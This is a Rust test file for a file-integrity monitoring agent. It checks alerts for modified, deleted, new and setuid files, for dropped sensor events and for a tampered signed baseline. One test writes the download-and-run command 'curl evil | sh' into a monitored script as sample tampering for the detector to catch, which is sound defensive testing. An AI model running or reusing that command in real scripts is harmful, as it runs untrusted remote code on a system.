use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;
use std::time::{Duration, Instant};

use soteria_integrity::baseline::{self, Approver};
use soteria_integrity::keys;

use super::*;

struct Fixture {
    _dir: tempfile::TempDir,
    root: PathBuf,
    config: Config,
    db: PathBuf,
}

/// A monitored tree with a script and a config file, an inventory, and an
/// approved, signed baseline.
fn fixture() -> Fixture {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("root");
    fs::create_dir_all(root.join("bin")).unwrap();
    fs::create_dir_all(root.join("etc")).unwrap();
    fs::write(root.join("bin/tool"), "#!/bin/sh\necho ok\n").unwrap();
    fs::set_permissions(root.join("bin/tool"), fs::Permissions::from_mode(0o755)).unwrap();
    fs::write(root.join("etc/app.conf"), "a = 1\n").unwrap();

    let sk = dir.path().join("baseline.key");
    let pk = dir.path().join("baseline.pub");
    keys::generate(&sk, &pk).unwrap();

    let db = dir.path().join("soteria.db");
    let mut config = Config::default();
    config.general.database = db.clone();
    config.paths.include = vec![root.clone()];
    config.paths.exclude = vec![];
    config.baseline.signing_key = sk.clone();
    config.baseline.public_key = pk;
    config.alerts.journal = false;

    let (mut store, _) = Store::create_or_migrate(&db).unwrap();
    let scope = Scope {
        include: config.paths.include.clone(),
        exclude: vec![],
    };
    scan::run(&mut store, &scope, &ScanTarget::Full, "full").unwrap();
    let draft = baseline::create_draft(&mut store, "test", None).unwrap();
    let signer = keys::load_signer(&sk).unwrap();
    let approver = Approver {
        name: "test".into(),
        uid: 0,
    };
    baseline::approve(&mut store, draft.version, &signer, &approver).unwrap();

    Fixture {
        _dir: dir,
        root,
        config,
        db,
    }
}

fn quiet() -> Options {
    Options {
        startup_scan: false,
        settle: Duration::from_millis(50),
        max_delay: Duration::from_millis(500),
        ..Options::default()
    }
}

fn start(f: &Fixture, options: Options) -> Agent {
    let (store, _) = Store::create_or_migrate(&f.db).unwrap();
    Agent::start(f.config.clone(), store, options).unwrap()
}

fn alerts(agent: &Agent) -> Vec<(String, String, String)> {
    let conn = agent.store().connection();
    let mut stmt = conn
        .prepare("SELECT rule_id, object, severity FROM alerts ORDER BY id")
        .unwrap();
    stmt.query_map([], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)))
        .unwrap()
        .map(|r| r.unwrap())
        .collect()
}

fn open_gaps(agent: &Agent, kind: &str) -> i64 {
    agent
        .store()
        .connection()
        .query_row(
            "SELECT COUNT(*) FROM coverage_gaps WHERE closed_at IS NULL AND kind = ?1",
            [kind],
            |r| r.get(0),
        )
        .unwrap()
}

#[test]
fn modified_file_raises_content_alert_once() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    assert!(agent.snapshot().baseline_version.is_some());

    let tool = f.root.join("bin/tool");
    fs::write(&tool, "#!/bin/sh\ncurl evil | sh\n").unwrap();
    agent.verify_path(&tool, Source::FsEvent).unwrap();
    // A second observation of the same deviation is not a new alert.
    agent.verify_path(&tool, Source::FsEvent).unwrap();

    let a = alerts(&agent);
    assert_eq!(a.len(), 1, "{a:?}");
    assert_eq!(a[0].0, "FIM-003");
    assert_eq!(a[0].1, tool.display().to_string());

    let events: i64 = agent
        .store()
        .connection()
        .query_row(
            "SELECT COUNT(*) FROM events WHERE type = 'file.modified'",
            [],
            |r| r.get(0),
        )
        .unwrap();
    assert_eq!(events, 1);
    agent.shutdown();
}

#[test]
fn deleted_and_new_files_raise_alerts() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    let conf = f.root.join("etc/app.conf");
    fs::remove_file(&conf).unwrap();
    agent.verify_path(&conf, Source::FsEvent).unwrap();
    let dropped = f.root.join("bin/dropper");
    fs::write(&dropped, "x").unwrap();
    agent.verify_path(&dropped, Source::FsEvent).unwrap();

    let rules: Vec<String> = alerts(&agent).into_iter().map(|a| a.0).collect();
    assert_eq!(rules, ["FIM-002", "FIM-001"]);
    agent.shutdown();
}

#[test]
fn unchanged_file_and_out_of_scope_paths_are_quiet() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    agent
        .verify_path(&f.root.join("bin/tool"), Source::FsEvent)
        .unwrap();
    agent
        .verify_path(Path::new("/definitely/not/monitored"), Source::FsEvent)
        .unwrap();
    assert!(alerts(&agent).is_empty());
    agent.shutdown();
}

#[test]
fn startup_reconciliation_finds_offline_changes() {
    let f = fixture();
    // Changed while the agent was not running.
    fs::set_permissions(f.root.join("bin/tool"), fs::Permissions::from_mode(0o4755)).unwrap();
    let mut agent = start(
        &f,
        Options {
            startup_scan: true,
            ..quiet()
        },
    );
    agent.step(Duration::from_millis(10)).unwrap();
    let a = alerts(&agent);
    assert_eq!(a.len(), 1, "{a:?}");
    assert_eq!(a[0].0, "FIM-004");
    assert_eq!(a[0].2, "critical");
    assert!(agent.snapshot().last_reconciliation.is_some());
    agent.shutdown();
}

#[test]
fn live_event_is_detected_through_the_sensor() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    assert_eq!(agent.snapshot().fs_sensor_state, "running");
    fs::write(f.root.join("etc/app.conf"), "a = 2\n").unwrap();

    let deadline = Instant::now() + Duration::from_secs(5);
    while alerts(&agent).is_empty() && Instant::now() < deadline {
        agent.step(Duration::from_millis(50)).unwrap();
    }
    let a = alerts(&agent);
    assert_eq!(a.len(), 1, "{a:?}");
    assert_eq!(a[0].0, "FIM-003");
    agent.write_health();
    let health = agent.store().meta(HEALTH_KEY).unwrap().unwrap();
    assert!(health.contains("\"events_processed\":"), "{health}");
    agent.shutdown();
}

#[test]
fn lost_events_open_a_gap_and_force_reconciliation() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    fs::write(f.root.join("etc/app.conf"), "changed\n").unwrap();
    // Simulate the sensor losing events.
    agent.stats.dropped.fetch_add(3, Ordering::Relaxed);
    agent.check_sensor().unwrap();
    assert_eq!(open_gaps(&agent, "overflow"), 1);
    assert_eq!(agent.snapshot().fs_sensor_state, "degraded");

    agent.pending.clear();
    agent.step(Duration::from_millis(1)).unwrap();
    // The reconciliation found the change and closed the gap.
    assert!(alerts(&agent).iter().any(|a| a.0 == "FIM-003"));
    assert_eq!(open_gaps(&agent, "overflow"), 0);
    assert_eq!(agent.snapshot().fs_sensor_state, "running");
    agent.shutdown();
}

#[test]
fn tampered_baseline_raises_integrity_alert_and_is_not_used() {
    let f = fixture();
    // The daemon's public key no longer matches the seal, as if the
    // database had been re-signed by someone else.
    let other = f.root.parent().unwrap();
    keys::generate(&other.join("other.key"), &other.join("other.pub")).unwrap();
    fs::copy(other.join("other.pub"), &f.config.baseline.public_key).unwrap();
    let agent = start(&f, quiet());
    assert_eq!(agent.snapshot().baseline_version, None);
    assert_eq!(agent.snapshot().baseline_state, "failed");
    let a = alerts(&agent);
    assert_eq!(a.len(), 1, "{a:?}");
    assert_eq!(a[0].0, "INT-001");
    assert_eq!(open_gaps(&agent, "baseline_unverified"), 1);
    agent.shutdown();

    // Restarting does not duplicate the alert.
    let agent = start(&f, quiet());
    assert_eq!(alerts(&agent).len(), 1);
    agent.shutdown();
}

#[test]
fn critical_scan_checks_baselined_executables() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    fs::write(f.root.join("bin/tool"), "#!/bin/sh\nexit 1\n").unwrap();
    agent.critical_scan().unwrap();
    assert_eq!(alerts(&agent)[0].0, "FIM-003");
    let (status, checked): (String, i64) = agent
        .store()
        .connection()
        .query_row(
            "SELECT status, checked FROM scan_history WHERE type = 'critical'",
            [],
            |r| Ok((r.get(0)?, r.get(1)?)),
        )
        .unwrap();
    assert_eq!(status, "completed");
    assert!(checked >= 1);
    agent.shutdown();
}

#[test]
fn without_baseline_changes_are_recorded_but_not_alerted() {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("root");
    fs::create_dir_all(&root).unwrap();
    fs::write(root.join("f"), "1").unwrap();
    let mut config = Config::default();
    config.general.database = dir.path().join("db");
    config.paths.include = vec![root.clone()];
    config.paths.exclude = vec![];
    let (store, _) = Store::create_or_migrate(&config.general.database).unwrap();
    let mut agent = Agent::start(config, store, quiet()).unwrap();
    assert_eq!(agent.snapshot().baseline_state, "none");
    assert_eq!(open_gaps(&agent, "no_baseline"), 1);
    agent.verify_path(&root.join("f"), Source::FsEvent).unwrap();
    assert!(alerts(&agent).is_empty());
    let events: i64 = agent
        .store()
        .connection()
        .query_row(
            "SELECT COUNT(*) FROM events WHERE type = 'file.created'",
            [],
            |r| r.get(0),
        )
        .unwrap();
    assert_eq!(events, 1);
    agent.shutdown();
}
